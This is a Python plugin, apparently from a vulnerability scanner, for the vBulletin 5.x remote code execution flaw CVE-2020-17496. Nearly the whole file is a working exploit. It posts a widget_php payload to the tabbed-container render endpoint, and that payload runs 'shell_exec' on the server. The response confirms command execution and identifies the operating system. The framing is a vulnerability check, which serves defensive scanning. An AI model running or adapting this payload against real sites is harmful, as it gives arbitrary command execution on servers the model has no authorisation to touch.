#!/usr/bin/python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class CVE_2020_17496_BaseVerify:
     def __init__(self, url):
          self.info = {
               'name': 'CVE-2019-16759 Bypass',
               'description': 'vBulletin 5.x Front Code Execution Vulnerability, 受影响版本: vBulletin 5.5.4-5.6.2',
               'date': '2020-08-10',
               'exptype': 'check',
               'type': 'RCE'
          }
          self.url = url
          if not self.url.startswith("http") and not self.url.startswith("https"):
               self.url = "http://" + self.url
          self.payload_url = self.url
          if '/ajax/render/widget_tabbedcontainer_tab_panel' not in self.payload_url:
               self.payload_url = self.payload_url + '/ajax/render/widget_tabbedcontainer_tab_panel'
          self.osname = 'Unknown'
          
          self.capta = get_capta()
          self.headers = {
            'User-Agent': get_useragent()
          }

     async def check(self):
    
          """
          检测是否存在漏洞

          :param:

          :return bool True or False: 是否存在漏洞
          """
          
          try:
               check_payload = {
                    'subWidgets[0][template]' : 'widget_php',
                    'subWidgets[0][config][code]' : "echo shell_exec('%s'); exit;" % ('echo ' + self.capta + 'win^dowslin$1ux')
               }
               check_req = await request.post(self.payload_url, data = check_payload)
               if check_req.status == 200 and self.capta in await check_req.text():
                    if 'windows' in await check_req.text():
                         self.osname = 'Windows'
                    elif 'linux' in await check_req.text():
                         self.osname = 'Linux'
                    return True
          except Exception as e:
               # print(e)
               pass

if  __name__ == "__main__":
    CVE_2020_17496 = CVE_2020_17496_BaseVerify('http://127.0.0.1:32768')
    CVE_2020_17496.check()
